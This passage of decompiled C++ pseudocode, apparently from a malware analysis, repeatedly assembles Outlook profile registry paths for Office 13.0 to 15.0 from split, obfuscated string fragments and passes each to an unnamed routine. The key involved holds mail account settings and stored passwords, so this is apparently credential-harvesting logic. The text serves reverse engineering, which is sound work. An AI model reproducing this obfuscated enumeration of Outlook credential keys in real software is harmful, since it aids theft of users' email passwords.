    operator delete(str_B88A00104B2A6676_00000001.u._Ptr);
  str_B88A00104B2A6676_00000001._Myres = 0xF;
  str_B88A00104B2A6676_00000001._Mysize = 0;
  str_B88A00104B2A6676_00000001.u._Buf[0] = 0;
  v71 = strlen("B88A00104B2A6676\\00000004");
  std::string::assign(&str_B88A00104B2A6676_00000001, "B88A00104B2A6676\\00000004", v71);
  v258 = 0x46;
  str_Windows._Myres = 0xF;
  str_Windows._Mysize = 0;
  str_Windows.u._Buf[0] = 0;
  v72 = strlen("look\\9375CFF0413111d3");
  std::string::assign(&str_Windows, "look\\9375CFF0413111d3", v72);
  LOBYTE(v258) = 0x47;
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  v73 = strlen("ook\\Profiles\\Out");
  std::string::assign(&str_CurrentVersion_WindowsMess, "ook\\Profiles\\Out", v73);
  LOBYTE(v258) = 0x48;
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  v74 = strlen("ce\\13.0\\Outl");
  std::string::assign(&str_Profiles_Out, "ce\\13.0\\Outl", v74);
  LOBYTE(v258) = 0x49;
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  v75 = strlen("osoft\\Offi");
  std::string::assign(&str_look_9375CFF0413111d3, "osoft\\Offi", v75);
  LOBYTE(v258) = 0x4A;
  v76 = vdr_std_strcpy_wrap("Software\\Micr", &v250, &str_look_9375CFF0413111d3);
  LOBYTE(v258) = 0x4B;
  v77 = vdr_str_operation_2(&str_Profiles_Out, v76, &v249);
  LOBYTE(v258) = 0x4C;
  v78 = vdr_str_operation_2(&str_CurrentVersion_WindowsMess, v77, &v251);
  LOBYTE(v258) = 0x4D;
  v79 = vdr_str_operation_2(&str_Windows, v78, &a3);
  LOBYTE(v258) = 0x4E;
  v80 = vdr_str_operation_2(&str_B88A00104B2A6676_00000001, v79, &v248);
  LOBYTE(v258) = 0x4F;
  if ( v80->_Myres >= 0x10 )
    v80 = (std_string *)v80->u._Ptr;
  sub_405560(v80);
  if ( v248._Myres >= 0x10 )
    operator delete(v248.u._Ptr);
  v248._Myres = 0xF;
  v248._Mysize = 0;
  v248.u._Buf[0] = 0;
  if ( a3._Myres >= 0x10 )
    operator delete(a3.u._Ptr);
  a3._Myres = 0xF;
  a3._Mysize = 0;
  a3.u._Buf[0] = 0;
  if ( v251._Myres >= 0x10 )
    operator delete(v251.u._Ptr);
  v251._Myres = 0xF;
  v251._Mysize = 0;
  v251.u._Buf[0] = 0;
  if ( v249._Myres >= 0x10 )
    operator delete(v249.u._Ptr);
  v249._Myres = 0xF;
  v249._Mysize = 0;
  v249.u._Buf[0] = 0;
  if ( v250._Myres >= 0x10 )
    operator delete(v250.u._Ptr);
  v250._Myres = 0xF;
  v250._Mysize = 0;
  v250.u._Buf[0] = 0;
  if ( str_look_9375CFF0413111d3._Myres >= 0x10 )
    operator delete(str_look_9375CFF0413111d3.u._Ptr);
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  if ( str_Profiles_Out._Myres >= 0x10 )
    operator delete(str_Profiles_Out.u._Ptr);
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  if ( str_CurrentVersion_WindowsMess._Myres >= 0x10 )
    operator delete(str_CurrentVersion_WindowsMess.u._Ptr);
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  if ( str_Windows._Myres >= 0x10 )
    operator delete(str_Windows.u._Ptr);
  v258 = 0xFFFFFFFF;
  str_Windows._Myres = 0xF;
  str_Windows._Mysize = 0;
  str_Windows.u._Buf[0] = 0;
  if ( str_B88A00104B2A6676_00000001._Myres >= 0x10 )
    operator delete(str_B88A00104B2A6676_00000001.u._Ptr);
  str_B88A00104B2A6676_00000001._Myres = 0xF;
  str_B88A00104B2A6676_00000001._Mysize = 0;
  str_B88A00104B2A6676_00000001.u._Buf[0] = 0;
  v81 = strlen("B88A00104B2A6676\\00000001");
  std::string::assign(&str_B88A00104B2A6676_00000001, "B88A00104B2A6676\\00000001", v81);
  v258 = 0x50;
  str_Windows._Myres = 0xF;
  str_Windows._Mysize = 0;
  str_Windows.u._Buf[0] = 0;
  v82 = strlen("look\\9375CFF0413111d3");
  std::string::assign(&str_Windows, "look\\9375CFF0413111d3", v82);
  LOBYTE(v258) = 0x51;
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  v83 = strlen("ook\\Profiles\\Out");
  std::string::assign(&str_CurrentVersion_WindowsMess, "ook\\Profiles\\Out", v83);
  LOBYTE(v258) = 0x52;
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  v84 = strlen("ce\\14.0\\Outl");
  std::string::assign(&str_Profiles_Out, "ce\\14.0\\Outl", v84);
  LOBYTE(v258) = 0x53;
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  v85 = strlen("osoft\\Offi");
  std::string::assign(&str_look_9375CFF0413111d3, "osoft\\Offi", v85);
  LOBYTE(v258) = 0x54;
  v86 = vdr_std_strcpy_wrap("Software\\Micr", &v250, &str_look_9375CFF0413111d3);
  LOBYTE(v258) = 0x55;
  v87 = vdr_str_operation_2(&str_Profiles_Out, v86, &v249);
  LOBYTE(v258) = 0x56;
  v88 = vdr_str_operation_2(&str_CurrentVersion_WindowsMess, v87, &v251);
  LOBYTE(v258) = 0x57;
  v89 = vdr_str_operation_2(&str_Windows, v88, &a3);
  LOBYTE(v258) = 0x58;
  v90 = vdr_str_operation_2(&str_B88A00104B2A6676_00000001, v89, &v248);
  LOBYTE(v258) = 0x59;
  if ( v90->_Myres >= 0x10 )
    v90 = (std_string *)v90->u._Ptr;
  sub_405560(v90);
  if ( v248._Myres >= 0x10 )
    operator delete(v248.u._Ptr);
  v248._Myres = 0xF;
  v248._Mysize = 0;
  v248.u._Buf[0] = 0;
  if ( a3._Myres >= 0x10 )
    operator delete(a3.u._Ptr);
  a3._Myres = 0xF;
  a3._Mysize = 0;
  a3.u._Buf[0] = 0;
  if ( v251._Myres >= 0x10 )
    operator delete(v251.u._Ptr);
  v251._Myres = 0xF;
  v251._Mysize = 0;
  v251.u._Buf[0] = 0;
  if ( v249._Myres >= 0x10 )
    operator delete(v249.u._Ptr);
  v249._Myres = 0xF;
  v249._Mysize = 0;
  v249.u._Buf[0] = 0;
  if ( v250._Myres >= 0x10 )
    operator delete(v250.u._Ptr);
  v250._Myres = 0xF;
  v250._Mysize = 0;
  v250.u._Buf[0] = 0;
  if ( str_look_9375CFF0413111d3._Myres >= 0x10 )
    operator delete(str_look_9375CFF0413111d3.u._Ptr);
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  if ( str_Profiles_Out._Myres >= 0x10 )
    operator delete(str_Profiles_Out.u._Ptr);
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  if ( str_CurrentVersion_WindowsMess._Myres >= 0x10 )
    operator delete(str_CurrentVersion_WindowsMess.u._Ptr);
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  if ( str_Windows._Myres >= 0x10 )
    operator delete(str_Windows.u._Ptr);
  v258 = 0xFFFFFFFF;
  str_Windows._Myres = 0xF;
  str_Windows._Mysize = 0;
  str_Windows.u._Buf[0] = 0;
  if ( str_B88A00104B2A6676_00000001._Myres >= 0x10 )
    operator delete(str_B88A00104B2A6676_00000001.u._Ptr);
  str_B88A00104B2A6676_00000001._Myres = 0xF;
  str_B88A00104B2A6676_00000001._Mysize = 0;
  str_B88A00104B2A6676_00000001.u._Buf[0] = 0;
  v91 = strlen("B88A00104B2A6676\\00000002");
  std::string::assign(&str_B88A00104B2A6676_00000001, "B88A00104B2A6676\\00000002", v91);
  v258 = 0x5A;
  str_Windows._Myres = 0xF;
  str_Windows._Mysize = 0;
  str_Windows.u._Buf[0] = 0;
  v92 = strlen("look\\9375CFF0413111d3");
  std::string::assign(&str_Windows, "look\\9375CFF0413111d3", v92);
  LOBYTE(v258) = 0x5B;
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  v93 = strlen("ook\\Profiles\\Out");
  std::string::assign(&str_CurrentVersion_WindowsMess, "ook\\Profiles\\Out", v93);
  LOBYTE(v258) = 0x5C;
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  v94 = strlen("ce\\14.0\\Outl");
  std::string::assign(&str_Profiles_Out, "ce\\14.0\\Outl", v94);
  LOBYTE(v258) = 0x5D;
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  v95 = strlen("osoft\\Offi");
  std::string::assign(&str_look_9375CFF0413111d3, "osoft\\Offi", v95);
  LOBYTE(v258) = 0x5E;
  v96 = vdr_std_strcpy_wrap("Software\\Micr", &v250, &str_look_9375CFF0413111d3);
  LOBYTE(v258) = 0x5F;
  v97 = vdr_str_operation_2(&str_Profiles_Out, v96, &v249);
  LOBYTE(v258) = 0x60;
  v98 = vdr_str_operation_2(&str_CurrentVersion_WindowsMess, v97, &v251);
  LOBYTE(v258) = 0x61;
  v99 = vdr_str_operation_2(&str_Windows, v98, &a3);
  LOBYTE(v258) = 0x62;
  v100 = vdr_str_operation_2(&str_B88A00104B2A6676_00000001, v99, &v248);
  LOBYTE(v258) = 0x63;
  if ( v100->_Myres >= 0x10 )
    v100 = (std_string *)v100->u._Ptr;
  sub_405560(v100);
  if ( v248._Myres >= 0x10 )
    operator delete(v248.u._Ptr);
  v248._Myres = 0xF;
  v248._Mysize = 0;
  v248.u._Buf[0] = 0;
  if ( a3._Myres >= 0x10 )
    operator delete(a3.u._Ptr);
  a3._Myres = 0xF;
  a3._Mysize = 0;
  a3.u._Buf[0] = 0;
  if ( v251._Myres >= 0x10 )
    operator delete(v251.u._Ptr);
  v251._Myres = 0xF;
  v251._Mysize = 0;
  v251.u._Buf[0] = 0;
  if ( v249._Myres >= 0x10 )
    operator delete(v249.u._Ptr);
  v249._Myres = 0xF;
  v249._Mysize = 0;
  v249.u._Buf[0] = 0;
  if ( v250._Myres >= 0x10 )
    operator delete(v250.u._Ptr);
  v250._Myres = 0xF;
  v250._Mysize = 0;
  v250.u._Buf[0] = 0;
  if ( str_look_9375CFF0413111d3._Myres >= 0x10 )
    operator delete(str_look_9375CFF0413111d3.u._Ptr);
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  if ( str_Profiles_Out._Myres >= 0x10 )
    operator delete(str_Profiles_Out.u._Ptr);
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  if ( str_CurrentVersion_WindowsMess._Myres >= 0x10 )
    operator delete(str_CurrentVersion_WindowsMess.u._Ptr);
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  if ( str_Windows._Myres >= 0x10 )
    operator delete(str_Windows.u._Ptr);
  v258 = 0xFFFFFFFF;
  str_Windows._Myres = 0xF;
  str_Windows._Mysize = 0;
  str_Windows.u._Buf[0] = 0;
  if ( str_B88A00104B2A6676_00000001._Myres >= 0x10 )
    operator delete(str_B88A00104B2A6676_00000001.u._Ptr);
  str_B88A00104B2A6676_00000001._Myres = 0xF;
  str_B88A00104B2A6676_00000001._Mysize = 0;
  str_B88A00104B2A6676_00000001.u._Buf[0] = 0;
  v101 = strlen("B88A00104B2A6676\\00000003");
  std::string::assign(&str_B88A00104B2A6676_00000001, "B88A00104B2A6676\\00000003", v101);
  v258 = 0x64;
  str_Windows._Myres = 0xF;
  str_Windows._Mysize = 0;
  str_Windows.u._Buf[0] = 0;
  v102 = strlen("look\\9375CFF0413111d3");
  std::string::assign(&str_Windows, "look\\9375CFF0413111d3", v102);
  LOBYTE(v258) = 0x65;
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  v103 = strlen("ook\\Profiles\\Out");
  std::string::assign(&str_CurrentVersion_WindowsMess, "ook\\Profiles\\Out", v103);
  LOBYTE(v258) = 0x66;
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  v104 = strlen("ce\\14.0\\Outl");
  std::string::assign(&str_Profiles_Out, "ce\\14.0\\Outl", v104);
  LOBYTE(v258) = 0x67;
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  v105 = strlen("osoft\\Offi");
  std::string::assign(&str_look_9375CFF0413111d3, "osoft\\Offi", v105);
  LOBYTE(v258) = 0x68;
  v106 = vdr_std_strcpy_wrap("Software\\Micr", &v250, &str_look_9375CFF0413111d3);
  LOBYTE(v258) = 0x69;
  v107 = vdr_str_operation_2(&str_Profiles_Out, v106, &v249);
  LOBYTE(v258) = 0x6A;
  v108 = vdr_str_operation_2(&str_CurrentVersion_WindowsMess, v107, &v251);
  LOBYTE(v258) = 0x6B;
  v109 = vdr_str_operation_2(&str_Windows, v108, &a3);
  LOBYTE(v258) = 0x6C;
  v110 = vdr_str_operation_2(&str_B88A00104B2A6676_00000001, v109, &v248);
  LOBYTE(v258) = 0x6D;
  if ( v110->_Myres >= 0x10 )
    v110 = (std_string *)v110->u._Ptr;
  sub_405560(v110);
  if ( v248._Myres >= 0x10 )
    operator delete(v248.u._Ptr);
  v248._Myres = 0xF;
  v248._Mysize = 0;
  v248.u._Buf[0] = 0;
  if ( a3._Myres >= 0x10 )
    operator delete(a3.u._Ptr);
  a3._Myres = 0xF;
  a3._Mysize = 0;
  a3.u._Buf[0] = 0;
  if ( v251._Myres >= 0x10 )
    operator delete(v251.u._Ptr);
  v251._Myres = 0xF;
  v251._Mysize = 0;
  v251.u._Buf[0] = 0;
  if ( v249._Myres >= 0x10 )
    operator delete(v249.u._Ptr);
  v249._Myres = 0xF;
  v249._Mysize = 0;
  v249.u._Buf[0] = 0;
  if ( v250._Myres >= 0x10 )
    operator delete(v250.u._Ptr);
  v250._Myres = 0xF;
  v250._Mysize = 0;
  v250.u._Buf[0] = 0;
  if ( str_look_9375CFF0413111d3._Myres >= 0x10 )
    operator delete(str_look_9375CFF0413111d3.u._Ptr);
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  if ( str_Profiles_Out._Myres >= 0x10 )
    operator delete(str_Profiles_Out.u._Ptr);
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  if ( str_CurrentVersion_WindowsMess._Myres >= 0x10 )
    operator delete(str_CurrentVersion_WindowsMess.u._Ptr);
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  if ( str_Windows._Myres >= 0x10 )
    operator delete(str_Windows.u._Ptr);
  v258 = 0xFFFFFFFF;
  str_Windows._Myres = 0xF;
  str_Windows._Mysize = 0;
  str_Windows.u._Buf[0] = 0;
  if ( str_B88A00104B2A6676_00000001._Myres >= 0x10 )
    operator delete(str_B88A00104B2A6676_00000001.u._Ptr);
  v199 = vdr_assign_str(&str_Windows, "B88A00104B2A6676\\00000004");
  v258 = 0x6E;
  v212 = vdr_assign_str(&str_CurrentVersion_WindowsMess, "look\\9375CFF0413111d3");
  LOBYTE(v258) = 0x6F;
  v225 = vdr_assign_str(&str_Profiles_Out, "ook\\Profiles\\Out");
  LOBYTE(v258) = 0x70;
  v191 = vdr_assign_str(&str_look_9375CFF0413111d3, "ce\\14.0\\Outl");
  LOBYTE(v258) = 0x71;
  v111 = vdr_assign_str(&str_B88A00104B2A6676_00000001, "osoft\\Offi");
  LOBYTE(v258) = 0x72;
  v112 = vdr_std_strcpy_wrap("Software\\Micr", &v250, v111);
  LOBYTE(v258) = 0x73;
  v113 = vdr_str_operation_2(v191, v112, &v249);
  LOBYTE(v258) = 0x74;
  v114 = vdr_str_operation_2(v225, v113, &v251);
  LOBYTE(v258) = 0x75;
  v115 = vdr_str_operation_2(v212, v114, &a3);
  LOBYTE(v258) = 0x76;
  v116 = vdr_str_operation_2(v199, v115, &v248);
  LOBYTE(v258) = 0x77;
  if ( v116->_Myres >= 0x10 )
    v116 = (std_string *)v116->u._Ptr;
  sub_405560(v116);
  if ( v248._Myres >= 0x10 )
    operator delete(v248.u._Ptr);
  v248._Myres = 0xF;
  v248._Mysize = 0;
  v248.u._Buf[0] = 0;
  if ( a3._Myres >= 0x10 )
    operator delete(a3.u._Ptr);
  a3._Myres = 0xF;
  a3._Mysize = 0;
  a3.u._Buf[0] = 0;
  if ( v251._Myres >= 0x10 )
    operator delete(v251.u._Ptr);
  v251._Myres = 0xF;
  v251._Mysize = 0;
  v251.u._Buf[0] = 0;
  if ( v249._Myres >= 0x10 )
    operator delete(v249.u._Ptr);
  v249._Myres = 0xF;
  v249._Mysize = 0;
  v249.u._Buf[0] = 0;
  if ( v250._Myres >= 0x10 )
    operator delete(v250.u._Ptr);
  v250._Myres = 0xF;
  v250._Mysize = 0;
  v250.u._Buf[0] = 0;
  if ( str_B88A00104B2A6676_00000001._Myres >= 0x10 )
    operator delete(str_B88A00104B2A6676_00000001.u._Ptr);
  str_B88A00104B2A6676_00000001._Myres = 0xF;
  str_B88A00104B2A6676_00000001._Mysize = 0;
  str_B88A00104B2A6676_00000001.u._Buf[0] = 0;
  if ( str_look_9375CFF0413111d3._Myres >= 0x10 )
    operator delete(str_look_9375CFF0413111d3.u._Ptr);
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  if ( str_Profiles_Out._Myres >= 0x10 )
    operator delete(str_Profiles_Out.u._Ptr);
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  if ( str_CurrentVersion_WindowsMess._Myres >= 0x10 )
    operator delete(str_CurrentVersion_WindowsMess.u._Ptr);
  v258 = 0xFFFFFFFF;
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  if ( str_Windows._Myres >= 0x10 )
    operator delete(str_Windows.u._Ptr);
  v192 = vdr_assign_str(&str_Windows, "B88A00104B2A6676\\00000001");
  v258 = 0x78;
  v226 = vdr_assign_str(&str_CurrentVersion_WindowsMess, "look\\9375CFF0413111d3");
  LOBYTE(v258) = 0x79;
  v213 = vdr_assign_str(&str_Profiles_Out, "ook\\Profiles\\Out");
  LOBYTE(v258) = 0x7A;
  v200 = vdr_assign_str(&str_look_9375CFF0413111d3, "ce\\15.0\\Outl");
  LOBYTE(v258) = 0x7B;
  v117 = vdr_assign_str(&str_B88A00104B2A6676_00000001, "osoft\\Offi");
  LOBYTE(v258) = 0x7C;
  v118 = vdr_std_strcpy_wrap("Software\\Micr", &v250, v117);
  LOBYTE(v258) = 0x7D;
  v119 = vdr_str_operation_2(v200, v118, &v249);
  LOBYTE(v258) = 0x7E;
  v120 = vdr_str_operation_2(v213, v119, &v251);
  LOBYTE(v258) = 0x7F;
  v121 = vdr_str_operation_2(v226, v120, &a3);
  LOBYTE(v258) = 0x80;
  v122 = vdr_str_operation_2(v192, v121, &v248);
  LOBYTE(v258) = 0x81;
  if ( v122->_Myres >= 0x10 )
    v122 = (std_string *)v122->u._Ptr;
  sub_405560(v122);
  if ( v248._Myres >= 0x10 )
    operator delete(v248.u._Ptr);
  v248._Myres = 0xF;
  v248._Mysize = 0;
  v248.u._Buf[0] = 0;
  if ( a3._Myres >= 0x10 )
    operator delete(a3.u._Ptr);
  a3._Myres = 0xF;
  a3._Mysize = 0;
  a3.u._Buf[0] = 0;
  if ( v251._Myres >= 0x10 )
    operator delete(v251.u._Ptr);
  v251._Myres = 0xF;
  v251._Mysize = 0;
  v251.u._Buf[0] = 0;
  if ( v249._Myres >= 0x10 )
    operator delete(v249.u._Ptr);
  v249._Myres = 0xF;
  v249._Mysize = 0;
  v249.u._Buf[0] = 0;
  if ( v250._Myres >= 0x10 )
    operator delete(v250.u._Ptr);
  v250._Myres = 0xF;
  v250._Mysize = 0;
  v250.u._Buf[0] = 0;
  if ( str_B88A00104B2A6676_00000001._Myres >= 0x10 )
    operator delete(str_B88A00104B2A6676_00000001.u._Ptr);
  str_B88A00104B2A6676_00000001._Myres = 0xF;
  str_B88A00104B2A6676_00000001._Mysize = 0;
  str_B88A00104B2A6676_00000001.u._Buf[0] = 0;
  if ( str_look_9375CFF0413111d3._Myres >= 0x10 )
    operator delete(str_look_9375CFF0413111d3.u._Ptr);
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  if ( str_Profiles_Out._Myres >= 0x10 )
    operator delete(str_Profiles_Out.u._Ptr);
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  if ( str_CurrentVersion_WindowsMess._Myres >= 0x10 )
    operator delete(str_CurrentVersion_WindowsMess.u._Ptr);
  v258 = 0xFFFFFFFF;
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  if ( str_Windows._Myres >= 0x10 )
    operator delete(str_Windows.u._Ptr);
  v193 = vdr_assign_str(&str_Windows, "B88A00104B2A6676\\00000002");
  v258 = 0x82;
  v227 = vdr_assign_str(&str_CurrentVersion_WindowsMess, "look\\9375CFF0413111d3");
  LOBYTE(v258) = 0x83;
  v214 = vdr_assign_str(&str_Profiles_Out, "ook\\Profiles\\Out");
  LOBYTE(v258) = 0x84;
  v201 = vdr_assign_str(&str_look_9375CFF0413111d3, "ce\\15.0\\Outl");
  LOBYTE(v258) = 0x85;
  v123 = vdr_assign_str(&str_B88A00104B2A6676_00000001, "osoft\\Offi");
  LOBYTE(v258) = 0x86;
  v124 = vdr_std_strcpy_wrap("Software\\Micr", &v250, v123);
  LOBYTE(v258) = 0x87;
  v125 = vdr_str_operation_2(v201, v124, &v249);
  LOBYTE(v258) = 0x88;
  v126 = vdr_str_operation_2(v214, v125, &v251);
  LOBYTE(v258) = 0x89;
  v127 = vdr_str_operation_2(v227, v126, &a3);
  LOBYTE(v258) = 0x8A;
  v128 = vdr_str_operation_2(v193, v127, &v248);
  LOBYTE(v258) = 0x8B;
  if ( v128->_Myres >= 0x10 )
    v128 = (std_string *)v128->u._Ptr;
  sub_405560(v128);
  if ( v248._Myres >= 0x10 )
    operator delete(v248.u._Ptr);
  v248._Myres = 0xF;
  v248._Mysize = 0;
  v248.u._Buf[0] = 0;
  if ( a3._Myres >= 0x10 )
    operator delete(a3.u._Ptr);
  a3._Myres = 0xF;
  a3._Mysize = 0;
  a3.u._Buf[0] = 0;
  if ( v251._Myres >= 0x10 )
    operator delete(v251.u._Ptr);
  v251._Myres = 0xF;
  v251._Mysize = 0;
  v251.u._Buf[0] = 0;
  if ( v249._Myres >= 0x10 )
    operator delete(v249.u._Ptr);
  v249._Myres = 0xF;
  v249._Mysize = 0;
  v249.u._Buf[0] = 0;
  if ( v250._Myres >= 0x10 )
    operator delete(v250.u._Ptr);
  v250._Myres = 0xF;
  v250._Mysize = 0;
  v250.u._Buf[0] = 0;
  if ( str_B88A00104B2A6676_00000001._Myres >= 0x10 )
    operator delete(str_B88A00104B2A6676_00000001.u._Ptr);
  str_B88A00104B2A6676_00000001._Myres = 0xF;
  str_B88A00104B2A6676_00000001._Mysize = 0;
  str_B88A00104B2A6676_00000001.u._Buf[0] = 0;
  if ( str_look_9375CFF0413111d3._Myres >= 0x10 )
    operator delete(str_look_9375CFF0413111d3.u._Ptr);
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  if ( str_Profiles_Out._Myres >= 0x10 )
    operator delete(str_Profiles_Out.u._Ptr);
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  if ( str_CurrentVersion_WindowsMess._Myres >= 0x10 )
    operator delete(str_CurrentVersion_WindowsMess.u._Ptr);
  v258 = 0xFFFFFFFF;
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  if ( str_Windows._Myres >= 0x10 )
    operator delete(str_Windows.u._Ptr);
  v194 = vdr_assign_str(&str_Windows, "B88A00104B2A6676\\00000003");
  v258 = 0x8C;
  v228 = vdr_assign_str(&str_CurrentVersion_WindowsMess, "look\\9375CFF0413111d3");
  LOBYTE(v258) = 0x8D;
  v215 = vdr_assign_str(&str_Profiles_Out, "ook\\Profiles\\Out");
  LOBYTE(v258) = 0x8E;
  v202 = vdr_assign_str(&str_look_9375CFF0413111d3, "ce\\15.0\\Outl");
  LOBYTE(v258) = 0x8F;
  v129 = vdr_assign_str(&str_B88A00104B2A6676_00000001, "osoft\\Offi");
  LOBYTE(v258) = 0x90;
  v130 = vdr_std_strcpy_wrap("Software\\Micr", &v250, v129);
  LOBYTE(v258) = 0x91;
  v131 = vdr_str_operation_2(v202, v130, &v249);
  LOBYTE(v258) = 0x92;
  v132 = vdr_str_operation_2(v215, v131, &v251);
  LOBYTE(v258) = 0x93;
  v133 = vdr_str_operation_2(v228, v132, &a3);
  LOBYTE(v258) = 0x94;
  v134 = vdr_str_operation_2(v194, v133, &v248);
  LOBYTE(v258) = 0x95;
  if ( v134->_Myres >= 0x10 )
    v134 = (std_string *)v134->u._Ptr;
  sub_405560(v134);
  if ( v248._Myres >= 0x10 )
    operator delete(v248.u._Ptr);
  v248._Myres = 0xF;
  v248._Mysize = 0;
  v248.u._Buf[0] = 0;
  if ( a3._Myres >= 0x10 )
    operator delete(a3.u._Ptr);
  a3._Myres = 0xF;
  a3._Mysize = 0;
  a3.u._Buf[0] = 0;
  if ( v251._Myres >= 0x10 )
    operator delete(v251.u._Ptr);
  v251._Myres = 0xF;
  v251._Mysize = 0;
  v251.u._Buf[0] = 0;
  if ( v249._Myres >= 0x10 )
    operator delete(v249.u._Ptr);
  v249._Myres = 0xF;
  v249._Mysize = 0;
  v249.u._Buf[0] = 0;
  if ( v250._Myres >= 0x10 )
    operator delete(v250.u._Ptr);
  v250._Myres = 0xF;
  v250._Mysize = 0;
  v250.u._Buf[0] = 0;
  if ( str_B88A00104B2A6676_00000001._Myres >= 0x10 )
    operator delete(str_B88A00104B2A6676_00000001.u._Ptr);
  str_B88A00104B2A6676_00000001._Myres = 0xF;
  str_B88A00104B2A6676_00000001._Mysize = 0;
  str_B88A00104B2A6676_00000001.u._Buf[0] = 0;
  if ( str_look_9375CFF0413111d3._Myres >= 0x10 )
    operator delete(str_look_9375CFF0413111d3.u._Ptr);
  str_look_9375CFF0413111d3._Myres = 0xF;
  str_look_9375CFF0413111d3._Mysize = 0;
  str_look_9375CFF0413111d3.u._Buf[0] = 0;
  if ( str_Profiles_Out._Myres >= 0x10 )
    operator delete(str_Profiles_Out.u._Ptr);
  str_Profiles_Out._Myres = 0xF;
  str_Profiles_Out._Mysize = 0;
  str_Profiles_Out.u._Buf[0] = 0;
  if ( str_CurrentVersion_WindowsMess._Myres >= 0x10 )
    operator delete(str_CurrentVersion_WindowsMess.u._Ptr);
  v258 = 0xFFFFFFFF;
  str_CurrentVersion_WindowsMess._Myres = 0xF;
  str_CurrentVersion_WindowsMess._Mysize = 0;
  str_CurrentVersion_WindowsMess.u._Buf[0] = 0;
  if ( str_Windows._Myres >= 0x10 )
    operator delete(str_Windows.u._Ptr);
  v195 = vdr_assign_str(&str_Windows, "B88A00104B2A6676\\00000004");
  v258 = 0x96;
  v229 = vdr_assign_str(&str_CurrentVersion_WindowsMess, "look\\9375CFF0413111d3");
  LOBYTE(v258) = 0x97;
  v216 = vdr_assign_str(&str_Profiles_Out, "ook\\Profiles\\Out");
